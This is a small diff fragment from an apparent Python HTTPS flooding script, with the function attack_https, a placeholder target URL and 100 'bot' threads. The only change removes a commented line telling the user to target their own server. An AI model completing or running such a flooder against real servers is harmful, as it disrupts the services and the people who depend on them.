@@ -10,7 +10,6 @@ def attack_https(url):
         except requests.exceptions.RequestException as e:
             print(f"Error: {e}")
 
-#url_target = "<target_url>"  # Ganti dengan URL server HTTPS milikmu
 url_target = "<target_url>"
 jumlah_bot = 100  # Jumlah bot (thread)
 
